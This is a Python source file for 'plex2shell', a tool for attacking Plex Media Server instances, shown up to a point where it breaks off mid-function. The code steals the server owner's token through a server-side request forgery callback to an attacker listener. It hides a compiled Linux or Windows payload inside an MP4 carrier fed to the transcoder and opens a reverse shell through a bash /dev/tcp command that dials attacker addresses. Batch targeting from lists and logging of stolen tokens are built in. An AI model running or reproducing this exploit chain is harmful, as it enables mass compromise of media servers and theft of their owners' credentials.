"""
    plex2shell
    Copyright (C) 2026 code-zm

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import argparse
import http.server
import json
import os
import re
import shutil
import socket
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
import types
import urllib.error
import urllib.parse
import urllib.request
from contextlib import redirect_stdout

try:
    import select
    import termios
    import tty
except ImportError:  # e.g. Windows attacker host; interactive PTY bridge disabled
    select = termios = tty = None

_DIR = os.path.dirname(os.path.abspath(__file__))
SHUTDOWN = threading.Event()          # global stop flag for cooperative shutdown
ACTIVE_RESOURCES = []                 # (closer, label) for emergency cleanup
STATE_PATH = os.path.join(_DIR, ".plex2shell_states.json")
LOG_LOCK = threading.Lock()

PLEX_DEFAULT_PORT = "32400"           # applied when a target line omits the port


# ============================================================================== UI
def _supports_color():
    return sys.stderr.isatty() and os.environ.get("TERM", "") != "dumb"


C = {"reset": "", "bold": "", "cyan": "", "green": "", "red": "", "grey": "", "white": ""}
if _supports_color():
    C = {"reset": "\033[0m", "bold": "\033[1m", "cyan": "\033[38;5;44m",
         "green": "\033[38;5;42m", "red": "\033[38;5;203m", "grey": "\033[38;5;244m",
         "white": "\033[38;5;253m"}
SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
FULL, EMPTY, BARW = "█", "░", 32

STAGES = [("Connecting to target", 12), ("Capturing owner token", 40),
          ("Verifying access", 52), ("Building payload", 72),
          ("Delivering payload", 88), ("Opening session", 99)]


def _open_tty():
    try:
        t = open("/dev/tty", "w")
        t.write("")                     # probe the stream
        return t
    except Exception:
        return sys.stderr


TTY = _open_tty()

def out(s):
    plain = re.sub(r"\x1b\[[0-9;]*m", "", s)
    for stream in (TTY, sys.stderr):
        try:
            stream.write(s)
            stream.flush()
            return
        except (OSError, ValueError):
            continue
    sys.stderr.write(plain)             # last resort


def bar(pct, frame, label, color="cyan", ok=False):
    fill = int(BARW * max(0.0, min(100.0, pct)) / 100.0)
    b = C[color] + FULL * fill + C["grey"] + EMPTY * (BARW - fill) + C["reset"]
    tick = (C["green"] + "✔" if ok else C[color] + SPIN[frame % len(SPIN)]) + C["reset"]
    out("\r\033[K  %s  %s  %s%3d%%%s   %s%s%s" % (
        tick, b, C["bold"] + C["white"], int(round(max(0.0, min(100.0, pct)))),
        C["reset"], C["white"], label, C["reset"]))


def commit(line):
    out("\r\033[K" + line + "\n")


def redact(t):
    if not t:
        return "captured"
    return (t[:10] + "…" + t[-4:]) if len(t) >= 14 else "captured"


class Step:
    """Run a blocking fn in a thread while the bar eases toward this stage's ceiling."""

    def __init__(self, idx):
        self.idx, self.ceil = idx, STAGES[idx][1]
        self.base = STAGES[idx - 1][1] if idx else 0

    def run(self, fn):
        res = {}
        done = threading.Event()

        def work():
            try:
                res["v"] = fn()
            except Exception as e:
                res["e"] = e
            finally:
                done.set()

        threading.Thread(target=work, daemon=True).start()
        pct, f = self.base, 0
        while not done.is_set():
            pct += (self.ceil - pct) * 0.06
            bar(pct, f, STAGES[self.idx][0])
            f += 1
            time.sleep(0.08)
        if "e" in res:
            bar(self.ceil, f, STAGES[self.idx][0], "red")
            commit("  %s✗%s %s   %s%s%s" % (C["red"], C["reset"],
                                            STAGES[self.idx][0], C["grey"], res["e"], C["reset"]))
            raise res["e"]
        return res.get("v")


# ============================================================================== retry helper
def with_retries(fn, attempts=3, delay=1.0, label="operation"):
    last = None
    for i in range(attempts):
        try:
            return fn(i)
        except Exception as e:
            last = e
            if i + 1 < attempts and not SHUTDOWN.is_set():
                out(C["grey"] + "  [warn] %s failed (%s); retry %d/%d\n"
                    % (label, str(e)[:80], i + 1, attempts - 1) + C["reset"])
                time.sleep(delay * (i + 1))
    raise last


# ============================================================================== hits log (--log)
def append_hit_log(path, entry):
    """Thread-safe append of one hit record to the hits log (plain text or JSON lines)."""
    if str(path).endswith(".json"):
        line = json.dumps(entry, ensure_ascii=False)
    else:
        token_part = ""
        if entry.get("token"):
            token_part = "  token=%s" % entry["token"]
        line = "%s  %s  os=%s%s" % (time.strftime("%Y-%m-%d %H:%M:%S"),
                                    entry["target"], entry.get("os", "?"), token_part)
    try:
        with LOG_LOCK:
            with open(path, "a", encoding="utf-8") as f:
                f.write(line + "\n")
    except OSError as e:
        out(C["red"] + "  [warn] cannot write hits log %s: %s\n" % (path, str(e)[:80])
            + C["reset"])


# ============================================================================== state file (resume support)
def _norm_path(path):
    return os.path.abspath(os.path.expanduser(path))


def _load_states():
    try:
        with open(STATE_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, dict) else {}
    except FileNotFoundError:
        return {}
    except (ValueError, OSError):
        # corrupt state file — start fresh rather than fail the run
        out(C["grey"] + "  [warn] states file corrupt, ignoring (%s)\n" % STATE_PATH + C["reset"])
        return {}


def _save_states(states):
    tmp = STATE_PATH + ".tmp.%d" % os.getpid()
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(states, f, indent=2)
        os.replace(tmp, STATE_PATH)
    except OSError as e:
        out(C["grey"] + "  [warn] cannot persist states file: %s\n" % str(e)[:100] + C["reset"])
    finally:
        try:
            if os.path.exists(tmp):
                os.remove(tmp)
        except OSError:
            pass


def _clear_state(key):
    states = _load_states()
    if key in states:
        del states[key]
        if states:
            _save_states(states)
        else:
            try:
                os.remove(STATE_PATH)
            except OSError:
                pass


# ============================================================================== target normalization
def normalize_target(raw):
    """Normalize a target given as a bare host:port or a full URL.

    Returns canonical "host:port", or None if unparseable.
    Accepts: 10.0.0.5:32400, http://10.0.0.5:32400, https://host:port/,
             https://host (port inferred from scheme), bare host.
    """
    s = raw.strip()
    if not s:
        return None
    # strip surrounding protocol if present
    m = re.match(r"^https?://", s, re.I)
    scheme = "https" if (m and s[:8].lower().endswith("https")) else ("http" if m else None)
    if m:
        s = s[m.end():]
    # drop any path/query/fragment
    s = s.split("/", 1)[0]
    s = s.split("?")[0].split("#")[0].rstrip(":")
    if not s:
        return None
    if "@" in s:                       # user:pass@host:port — keep only host part
        s = s.rsplit("@", 1)[-1]
    if s.startswith("["):              # IPv6 literal [::1]:32400
        m6 = re.match(r"^\[([^\]]+)\](?::(\d+))?$", s)
        if m6:
            host, port = m6.group(1), m6.group(2)
            port = port or PLEX_DEFAULT_PORT
            return "[%s]:%s" % (host, port)
        return None
    if ":" in s:
        host, _, port = s.rpartition(":")
        if not port.isdigit() or not (0 < int(port) < 65536):
            return None
        return "%s:%s" % (host, port)
    # no port: infer from scheme, else default
    port = "443" if scheme == "https" else PLEX_DEFAULT_PORT
    return "%s:%s" % (s, port)


# ============================================================================== list parsing
def parse_port_list(spec, flag):
    """Parse a comma-separated port list into a list of unique ints (order preserved)."""
    ports = []
    for tok in spec.split(","):
        tok = tok.strip()
        if not tok.isdigit() or not (0 < int(tok) < 65536):
            raise ValueError("invalid port %r in %s (must be 1-65535)" % (tok, flag))
        p = int(tok)
        if p not in ports:
            ports.append(p)
    if not ports:
        raise ValueError("%s is empty" % flag)
    return ports


def parse_ip_list(spec, flag):
    """Parse a comma-separated IP/hostname list (order preserved, duplicates kept
    so they can pair positionally with a port list)."""
    items = []
    for tok in spec.split(","):
        tok = tok.strip()
        if not tok:
            raise ValueError("empty entry in %s" % flag)
        items.append(tok)
    if not items:
        raise ValueError("%s is empty" % flag)
    return items


# ============================================================================== platforms
PLATFORMS = {
    "linux-native": {
        "os": "linux",
        "appsupport": "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server",
        "codec_suffix": "linux-x86_64", "ext": "so",
        "transcoder_path": "/usr/lib/plexmediaserver/Plex Transcoder",
    },
    "linux-docker": {
        "os": "linux",
        "appsupport": "/config/Library/Application Support/Plex Media Server",
        "codec_suffix": "linux-x86_64", "ext": "so",
        "transcoder_path": "/usr/lib/plexmediaserver/Plex Transcoder",
    },
    "windows": {
        "os": "windows",
        "appsupport": None,
        "codec_suffix": "windows-x86_64", "ext": "dll",
        "transcoder_path": "C:/Program Files/Plex/Plex Media Server/Plex Transcoder.exe",
    },
}


def resolve_platform(target_os_key):
    if target_os_key not in PLATFORMS:
        raise RuntimeError("unknown --target-os %r; choose one of: %s"
                           % (target_os_key, ", ".join(PLATFORMS)))
    return PLATFORMS[target_os_key]


# ============================================================================== payloads

def _read_payload(name):
    path = os.path.join(_DIR, name)
    if not os.path.isfile(path):
        raise FileNotFoundError("required payload source not found: %s "
                                "(expected next to the script)" % path)
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except UnicodeDecodeError:
        with open(path, "r", encoding="latin-1") as f:
            return f.read()


def _run_checked(cmd, label):
    try:
        subprocess.check_call(cmd, stderr=subprocess.STDOUT)
    except FileNotFoundError:
        raise RuntimeError("tool missing for %s: %r" % (label, cmd[0]))
    except subprocess.CalledProcessError as e:
        raise RuntimeError("%s failed with exit code %d" % (label, e.returncode))


def build_payload_linux(workdir, inner_cmd):
    cc = shutil.which("gcc")
    if not cc:
        raise RuntimeError("need 'gcc' on the attacker host for a Linux target payload")
    src = os.path.join(workdir, "pay.c")
    so = os.path.join(workdir, "pay.so")
    with open(src, "w") as f:
        f.write(_read_payload("payload_linux.c").replace("__CMD__", inner_cmd))
    _run_checked([cc, "-shared", "-fPIC", "-nostdlib", "-O2", "-o", so, src],
                 "Linux payload compile")
    with open(so, "rb") as f:
        data = f.read()
    if data[:4] != b"\x7fELF":
        raise RuntimeError("payload is not an ELF")
    return so, data


def build_payload_windows(workdir, rhost, rport):
    cc = shutil.which("x86_64-w64-mingw32-gcc")
    if not cc:
        raise RuntimeError("need 'x86_64-w64-mingw32-gcc' (apt: gcc-mingw-w64-x86-64)")
    src = os.path.join(workdir, "pay.c")
    dll = os.path.join(workdir, "pay.dll")
    with open(src, "w") as f:
        f.write(_read_payload("payload_windows.c")
                .replace("__IP__", rhost).replace("__PORT__", str(rport)))
    _run_checked([cc, "-shared", "-O2", "-o", dll, src,
                  "-lws2_32", "-lkernel32", "-Wl,--subsystem,windows"],
                 "Windows payload compile")
    with open(dll, "rb") as f:
        data = f.read()
    if data[:2] != b"MZ":
        raise RuntimeError("payload is not a PE DLL")
    return dll, data


def build_payload(target_os, workdir, callouts, inner_cmd=None):
    """callouts: list of (ip, port) pairs the payload should try, in order."""
    if target_os == "linux":
        return build_payload_linux(workdir, inner_cmd)
    # windows: a single DLL goes into a single carrier, so only the FIRST
    # (ip, port) callout pair can be embedded (see -h)
    rhost, rport = callouts[0]
    return build_payload_windows(workdir, rhost, rport)


def build_carrier(workdir, payload_bytes, w, h):
    """Encode payload_bytes into frame-0 luma of a lossless (qp=0) carrier + silent audio track."""
    if not shutil.which("ffmpeg"):
        raise RuntimeError("need 'ffmpeg' on the attacker host to build the carrier")
    ysz = w * h
    if len(payload_bytes) > ysz:
        raise RuntimeError("payload (%d B) larger than luma plane %dx%d=%d; raise --geometry"
                           % (len(payload_bytes), w, h, ysz))
    y = payload_bytes + b"\x80" * (ysz - len(payload_bytes))
    uv = b"\x80" * (ysz // 2)
    frame = y + uv
    raw = os.path.join(workdir, "raw.yuv")
    carrier = os.path.join(workdir, "carrier.mp4")
    with open(raw, "wb") as f:
        f.write(frame * 3)
    _run_checked([
        "ffmpeg", "-loglevel", "error", "-y",
        "-f", "rawvideo", "-pix_fmt", "yuv420p", "-s", "%dx%d" % (w, h), "-r", "5", "-i", raw,
        "-f", "lavfi", "-i", "anullsrc=r=48000:cl=stereo", "-shortest",
        "-c:v", "libx264", "-qp", "0", "-pix_fmt", "yuv420p", "-g", "1",
        "-c:a", "aac", "-b:a", "64k",
        "-movflags", "+faststart", carrier,
    ], "carrier encode")
    dec = os.path.join(workdir, "dec.yuv")
    _run_checked([
        "ffmpeg", "-loglevel", "error", "-y", "-i", carrier, "-map", "0:v:0",
        "-pix_fmt", "yuv420p", "-f", "rawvideo", dec,
    ], "carrier verify decode")
    with open(dec, "rb") as f:
        d = f.read()
    if d[:len(payload_bytes)] != payload_bytes:
        raise RuntimeError("carrier is NOT bit-exact (encoder altered the plane); adjust geometry")
    return carrier


def revshell_cmd(callouts):
    """Build a Linux shell command that dials each (ip, port) callout pair in order
    until one connects. callouts: list of (ip, port)."""
    # brackets around bare IPv6 literals for /dev/tcp
    targets = " ".join("%s:%d" % (ip if ":" not in ip else "[%s]" % ip, p)
                       for ip, p in callouts)
    return ("/usr/bin/setsid /usr/bin/bash -c 'for t in %s; do "
            "/usr/bin/bash -c \"exec 0<>/dev/tcp/$t 1>&0 2>&0; "
            "exec /usr/bin/script -qc /bin/bash /dev/null\" && break; done' &"
            % targets)


# ============================================================================== attacker HTTP: media host
CALLBACKS = []

ITEM_XML = ('<?xml version="1.0" encoding="UTF-8"?><MediaContainer size="1">'
            '<Video ratingKey="1" key="/library/metadata/1" type="movie" title="poc" duration="3000">'
            '<Media id="1" duration="3000" width="{w}" height="{h}" aspectRatio="1.78" '
            'videoCodec="h264" audioCodec="aac" container="mp4" videoFrameRate="24p">'
            '<Part id="1" key="http://{ip}:{port}/carrier.mp4" duration="3000" '
            'file="carrier.mp4" size="{size}" container="mp4"/>'
            '</Media></Video></MediaContainer>')


def make_handler(carrier_path, item_xml_bytes):
    class H(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *a):
            pass

        def _send(self, body, ctype):
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            try:
                p = urllib.parse.urlparse(self.path).path
                if p.startswith("/cb"):
                    CALLBACKS.append(self.path)
                    self._send(b"ok", "text/plain")
                elif p.rstrip("/").endswith("item.xml") or p == "/item.xml":
                    self._send(item_xml_bytes, "text/xml")
                elif p.endswith("carrier.mp4"):
                    try:
                        with open(carrier_path, "rb") as f:
                            data = f.read()
                    except OSError as e:
                        print("    [listener] carrier read failed: %s" % e)
                        self.send_error(404)
                        return
                    rng = self.headers.get("Range")
                    m = re.match(r"bytes=(\d+)-(\d*)", rng) if rng else None
                    if m:
                        start = int(m.group(1))
                        end = int(m.group(2)) if m.group(2) else len(data) - 1
                        start = min(start, len(data) - 1)
                        end = min(end, len(data) - 1)
                        chunk = data[start:end + 1]
                        self.send_response(206)
                        self.send_header("Content-Type", "video/mp4")
                        self.send_header("Content-Length", str(len(chunk)))
                        self.send_header("Content-Range",
                                         "bytes %d-%d/%d" % (start, end, len(data)))
                        self.send_header("Accept-Ranges", "bytes")
                        self.end_headers()
                        self.wfile.write(chunk)
                    else:
                        self.send_response(200)
                        self.send_header("Content-Type", "video/mp4")
                        self.send_header("Content-Length", str(len(data)))
                        self.send_header("Accept-Ranges", "bytes")
                        self.end_headers()
                        self.wfile.write(data)
                else:
                    self._send(b"", "text/plain")
            except (BrokenPipeError, ConnectionResetError):
                pass
            except Exception as e:
                print("    [listener] handler error: %s" % e)
                try:
                    self.send_error(500)
                except Exception:
                    pass

        do_HEAD = do_GET

    return H


class Listener(threading.Thread):
    def __init__(self, ip, port, carrier_path, item_xml_bytes):
        super().__init__(daemon=True)
        socketserver.TCPServer.allow_reuse_address = True
        self.httpd = socketserver.ThreadingTCPServer((ip, port),
                                                     make_handler(carrier_path, item_xml_bytes))
        ACTIVE_RESOURCES.append((self.stop, "carrier listener"))

    def run(self):
        try:
            self.httpd.serve_forever(poll_interval=0.2)
        except Exception as e:
            if not SHUTDOWN.is_set():
                print("    [listener] stopped: %s" % e)

    def stop(self):
        try:
            self.httpd.shutdown()
        except Exception:
            pass
        try:
            self.httpd.server_close()
        except Exception:
            pass


# ============================================================================== attacker HTTP: token catcher
_TOKEN_RE = re.compile(r"^local-[0-9a-f-]{8,}", re.I)


class TokenCatcher(threading.Thread):
    def __init__(self, bind_ip, port):
        super().__init__(daemon=True)
        self.port = port
        self.hits = []
        self.token = None
        self.got = threading.Event()
        outer = self

        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _serve(self):
                try:
                    tok = self.headers.get("X-Plex-Token", "")
                    outer.hits.append((self.command, self.path, dict(self.headers)))
                    print("    [listener] %s %s   X-Plex-Token=%s"
                          % (self.command, self.path, tok or "(none)"))
                    if tok and _TOKEN_RE.match(tok) and not outer.token:
                        outer.token = tok
                        outer.got.set()
                    self.send_response(200)
                    self.send_header("Content-Length", "2")
                    self.end_headers()
                    self.wfile.write(b"ok")
                except (BrokenPipeError, ConnectionResetError):
                    pass
                except Exception as e:
                    print("    [token-catcher] handler error: %s" % e)

            do_GET = _serve
            do_POST = _serve

        socketserver.TCPServer.allow_reuse_address = True
        self.httpd = socketserver.ThreadingTCPServer((bind_ip, port), H)
        ACTIVE_RESOURCES.append((self.stop, "token catcher"))

    def run(self):
        try:
            self.httpd.serve_forever(poll_interval=0.2)
        except Exception as e:
            if not SHUTDOWN.is_set():
                print("    [token-catcher] stopped: %s" % e)

    def stop(self):
        try:
            self.httpd.shutdown()
        except Exception:
            pass
        try:
            self.httpd.server_close()
        except Exception:
            pass


# ============================================================================== Plex HTTP helpers
def hget(base, path, params, token, timeout=25, method="GET"):
    qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
    url = "%s%s?%s" % (base, path, qs)
    req = urllib.request.Request(url, method=method)
    if token:
        req.add_header("X-Plex-Token", token)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:
        return -1, str(e).encode()


def preq(base, path, headers, timeout=15):
    try:
        r = urllib.request.Request("http://%s%s" % (base, path), headers=headers)
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        return "ERR:%s" % (str(e)[:70])


def _hget_retry(base, path, params, token, attempts=3, method="GET"):
    def attempt(_):
        st, body = hget(base, path, params, token, method=method)
        if st in (-1,):
            raise ConnectionError("request to %s%s failed" % (base, path))
        return st, body
    return with_retries(attempt, attempts=attempts, label="HTTP %s %s" % (method, path))


def discover_setid(base, token, transcoder_path):
    if not transcoder_path:
        return None
    for route in ("/system/:/resources/x", "/:/plugins/com.plexapp.system/resources/x"):
        st, body = _hget_retry(base, route, {"resource_name": transcoder_path}, token)
        if st == 200 and body:
            m = re.search(rb'([0-9a-f]{7}-[0-9a-f]{24,26})', body)
            if m:
                return m.group(1).decode()
    return None


def transcode_params(item_url, session, w, h):
    return [
        ("path", item_url), ("protocol", "hls"),
        ("directPlay", "0"), ("directStream", "0"),
        ("videoResolution", "%dx%d" % (w, h)),
        ("videoQuality", "100"), ("maxVideoBitrate", "200000"),
        ("mediaBufferSize", "102400"), ("session", session),
        ("X-Plex-Client-Identifier", "vfyclient01"),
        ("X-Plex-Product", "Plex Web"), ("X-Plex-Platform", "Chrome"),
        ("X-Plex-Platform-Version", "120.0"), ("X-Plex-Device", "Linux"),
        ("X-Plex-Device-Name", "poc"), ("X-Plex-Client-Profile-Name", "Chrome"),
        ("X-Plex-Session-Identifier", session),
    ]


def run_transcode(base, token, item_url, session, w, h):
    p = transcode_params(item_url, session, w, h)
    st1, _ = _hget_retry(base, "/video/:/transcode/universal/decision", p, token)
    st2, _ = _hget_retry(base, "/video/:/transcode/universal/start.m3u8", p, token)
    st3, _ = _hget_retry(base, "/video/:/transcode/universal/session/%s/base/index.m3u8" % session,
                         [("session", session)], token)
    return st1, st2, st3


# ============================================================================== stage 1+2: bare-WAN token theft
def steal_owner_token(args):
    base = args.target
    try:
        listener = TokenCatcher("0.0.0.0", args.token_port)
    except OSError as e:
        raise RuntimeError("cannot bind token listener on port %d: %s "
                           "(is another instance running?)" % (args.token_port, e))
    listener.start()
    time.sleep(0.4)

    cid = "poc_%d" % (int(time.time()) % 100000)
    marker = "TKN_%d" % (int(time.time()) % 100000)

    hdr = {
        "X-Plex-Client-Identifier": cid,
        "X-Plex-Platform": "poc", "X-Plex-Platform-Version": "1",
        "X-Plex-Product": "poc", "X-Plex-Version": "1",
        "X-Plex-Device": "poc", "X-Plex-Device-Name": "poc", "X-Plex-Model": "poc",
        "X-Plex-Token": args.junk_token,
    }
    common = "deviceClass=pc&protocolCapabilities=playback&protocolVersion=1"

    ident = ("com.plexapp.agents.thetvdb/function/GetResultFromNetwork"
             "?url=http://%s:%d/%s#" % (args.attacker_host, args.token_port, marker))
    protocol = ("http://127.0.0.1:%d/system/agents/z/searchOne?mediaType=1&lang=en&identifier=%s"
                % (args.plex_port, urllib.parse.quote(ident, safe="")))
    proto_q = urllib.parse.quote(protocol, safe="")

    reg_path = "/player/proxy/poll?%s&X-Plex-Client-Identifier=%s" % (common, cid)
    threading.Thread(target=lambda: preq(base, reg_path, hdr, timeout=12), daemon=True).start()
    time.sleep(1.5)

    try:
        sub = ("/player/timeline/subscribe?%s&protocol=%s&port=%d&commandID=1"
               "&X-Plex-Target-Client-Identifier=%s" % (common, proto_q, args.token_port, cid))
        preq(base, sub, hdr)
        time.sleep(0.5)

        unsub = ("/player/timeline/unsubscribe?%s&X-Plex-Target-Client-Identifier=%s" % (common, cid))
        preq(base, unsub, hdr)

        listener.got.wait(timeout=args.wait)
        token = listener.token
    finally:
        listener.stop()
        listener.join(timeout=3.0)     # ensure the catcher socket is really released
    return token


# ============================================================================== Windows cmd protocol helpers
def _win_wait_ready(conn):
    conn.settimeout(30)
    buf = b""
    try:
        while b"READY" not in buf:
            d = conn.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass


def _win_send_cmd(conn, cmd):
    conn.sendall((cmd + "\r\n").encode())
    conn.settimeout(30)
    buf = b""
    try:
        while b"__CMDEND__" not in buf:
            d = conn.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf.decode("utf-8", "replace").replace("\r", "").split("__CMDEND__")[0]


# ============================================================================== interactive PTY bridge
def drain(conn, t=0.5):
    conn.setblocking(False)
    end = time.time() + t
    while time.time() < end:
        try:
            d = conn.recv(4096)
            if not d:
                break
            end = time.time() + 0.15
        except (BlockingIOError, OSError):
            time.sleep(0.03)


def _win_interactive(conn, session_label, hostlabel):
    _win_wait_ready(conn)
    out(C["grey"] + "  command mode — type 'exit' to quit\n\n" + C["reset"])
    prompt = C["bold"] + session_label + " @ " + hostlabel + C["reset"] + "> "
    try:
        while True:
            try:
                line = input(prompt)
            except EOFError:
                break
            if not line.strip():
                continue
            if line.strip().lower() == "exit":
                conn.sendall(b"exit\r\n")
                break
            output = _win_send_cmd(conn, line)
            for ln in output.splitlines():
                print(ln)
    except KeyboardInterrupt:
        conn.sendall(b"exit\r\n")
    except (OSError, ConnectionError) as e:
        out("\n" + C["red"] + "  connection lost: %s\n" % str(e)[:80] + C["reset"])
    out("\n" + C["grey"] + "  session closed\n" + C["reset"])


def interactive(conn, hostlabel, so_path, target_os, session_label):
    commit("  %s✔%s %sOpening session%s" % (C["green"], C["reset"], C["white"], C["reset"]))
    out("\n  " + C["bold"] + C["green"] + "✔ session opened" + C["reset"] +
        C["white"] + "  —  " + session_label + " @ " + hostlabel + C["reset"] + "\n")

    if target_os != "linux":
        return _win_interactive(conn, session_label, hostlabel)

    if termios is None or tty is None or not sys.stdin.isatty():
        out(C["grey"] + "  (no PTY available on this host — falling back to conn mode)\n"
            + C["reset"])
        try:
            conn.setblocking(False)
            while True:
                d = conn.recv(4096)
                if not d:
                    break
                os.write(2, d)
        except Exception:
            pass
        return

    out(C["grey"] + "  interactive shell — press Ctrl-] to detach\n\n" + C["reset"])

    try:
        import fcntl
        import struct
        rows, cols = struct.unpack("HHHH",
            fcntl.ioctl(0, termios.TIOCGWINSZ, struct.pack("HHHH", 0, 0, 0, 0)))[:2]
        if not rows or not cols:
            rows, cols = 40, 120
    except Exception:
        rows, cols = 40, 120

    setup = ("rm -f '%s' 2>/dev/null; cd /; stty rows %d cols %d 2>/dev/null; "
             "export TERM=xterm-256color; PS1='plex@plex:\\w\\$ '\n"
             % (so_path, rows, cols))
    conn.sendall(setup.encode())
    time.sleep(0.5)
    drain(conn, 0.6)
    conn.sendall(b"\n")
    time.sleep(0.2)

    old = termios.tcgetattr(0)
    try:
        tty.setraw(0)
        conn.setblocking(False)
        while True:
            r, _, _ = select.select([0, conn], [], [])
            if 0 in r:
                d = os.read(0, 4096)
                if not d or b"\x1d" in d:
                    break
                conn.sendall(d)
            if conn in r:
                try:
                    d = conn.recv(4096)
                except BlockingIOError:
                    continue
                if not d:
                    break
                os.write(1, d)
    except (KeyboardInterrupt, ConnectionError, OSError):
        out("\n" + C["grey"] + "  session closed\n" + C["reset"])
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        out("\n" + C["grey"] + "  session detached\n" + C["reset"])


def run_exec(conn, command, so_path, target_os, session_label):
    out("\n  " + C["green"] + "✔ session opened (" + session_label + ")" + C["reset"] + "\n\n")
    if target_os == "linux":
        time.sleep(1)
        conn.setblocking(False)
        try:
            while True:
                conn.recv(4096)
        except Exception:
            pass
        conn.setblocking(True)
        conn.sendall(b"stty -echo 2>/dev/null\n")
        time.sleep(0.5)
        line = "rm -f '%s' 2>/dev/null; %s; echo __END__$?\n" % (so_path, command)
        conn.sendall(line.encode())
        conn.settimeout(15)
        buf = b""
        try:
            while b"__END__" not in buf:
                d = conn.recv(4096)
                if not d:
                    break
                buf += d
        except socket.timeout:
            pass
        for ln in buf.decode("utf-8", "replace").replace("\r", "").splitlines():
            if ln.startswith("__END__"):
                break
            if "echo __END__" in ln:
                continue
            print("    " + ln)
    else:
        _win_wait_ready(conn)
        output = _win_send_cmd(conn, command)
        conn.sendall(b"exit\r\n")
        for ln in output.splitlines():
            print("    " + ln)


# ============================================================================== orchestration
def _bind_listener(port, label):
    """Bind+listen a reverse-shell listener.

    NOTE: deliberately NOT registered in ACTIVE_RESOURCES. Its lifetime is managed
    explicitly in run_single's finally, which stops the accept loop, closes the
    socket, and joins the thread — a blocked accept() holds the fd open and would
    otherwise keep the port bound into the next target.
    """
    if not (0 < int(port) < 65536):
        raise RuntimeError("invalid port for %s: %r (must be 1-65535)" % (label, port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", int(port)))
    except OSError as e:
        sock.close()
        raise RuntimeError("cannot bind %s to port %d: %s — is the port already in use?"
                           % (label, int(port), e))
    try:
        sock.listen(1)
    except OSError as e:
        sock.close()
        raise RuntimeError("listen failed on port %d: %s" % (int(port), e))
    return sock


def _validate_dependencies(needed):
    missing = [t for t in needed if not shutil.which(t)]
    if missing:
        raise RuntimeError("missing required tool(s) on this host for the payload build: %s"
                           % ", ".join(missing))
    for name in ("payload_linux.c", "payload_windows.c"):
        if not os.path.isfile(os.path.join(_DIR, name)):
            raise RuntimeError("missing payload source file next to the script: %s" % name)


def _load_target_file(path):
    """Load targets from a file, one per line.

    Each line may be a bare host:port OR a full URL (with optional protocol,
    path, trailing slash). # comments, blank lines, and inline comments ignored.
    """
    if not os.path.isfile(path):
        raise RuntimeError("target file not found: %s" % path)
    targets = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            for lineno, raw in enumerate(f, 1):
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                line = line.split("#", 1)[0].strip()   # allow trailing comments
                norm = normalize_target(line)
                if not norm:
                    print("[-] skipping invalid target on line %d: %r" % (lineno, line))
                    continue
                if norm not in targets:
                    targets.append(norm)
    except OSError as e:
        raise RuntimeError("cannot read target file %s: %s" % (path, e))
    if not targets:
        raise RuntimeError("target file %s contains no valid targets" % path)
    return targets


def run_single(args, target):
    """Run the full chain against one target.

    Returns (rc, captured_token): 0 on session, nonzero on failure.
    Never raises — every failure is caught and reported.
    NOTE: never sets the global SHUTDOWN flag in the normal path — doing so would
    make the batch loop abort after the first target.
    """
    rc = 1
    captured_token = None
    try:
        plat = resolve_platform(args.target_os)
    except RuntimeError as e:
        out("\n\n  " + C["red"] + "✗ %s\n" % e + C["reset"])
        return 2, None

    target_os = plat["os"]
    appsupport = plat["appsupport"]
    codec_suffix = plat["codec_suffix"]
    ext = plat["ext"]
    transcoder_path = plat["transcoder_path"]
    session_label = "uid=1000(plex)" if target_os == "linux" else "the Plex service account"

    local_ip = args.local_attacker_ip
    # IP the target must reach for the SSRF token callback + carrier fetch
    attacker_host = "127.0.0.1.%s.sslip.io" % local_ip.replace(".", "-")
    token_port, carrier_port = 8952, 8933
    lports = list(args.lports)          # local bind ports (one listener each)
    callouts = list(zip(args.reverse_attacker_ips, args.rports))
    w, h = 640, 360

    base = "http://" + target            # target is now guaranteed scheme-free host:port
    logpath = os.path.join(tempfile.gettempdir(), ".plexshell_%d_%s.log"
                           % (os.getpid(), re.sub(r"[^A-Za-z0-9_.-]", "_", target)))
    try:
        log = open(logpath, "w")
    except OSError as e:
        out(C["red"] + "  [-] cannot open log file %s: %s\n" % (logpath, e) + C["reset"])
        return 2, None

    workdir = None
    conn = None
    token = args.token
    SHUTDOWN.clear()

    # ---- bind reverse-shell listeners for this target
    lsocks = []
    bind_error = None
    try:
        for p in lports:
            lsocks.append(_bind_listener(p, "reverse-shell listener %d" % p))
    except RuntimeError as e:
        for s in lsocks:          # release sockets bound before the failure
            try:
                s.close()
            except Exception:
                pass
        bind_error = e

    if bind_error is not None:
        out("\n\n  " + C["red"] + "✗ %s\n" % bind_error + C["reset"])
        try:
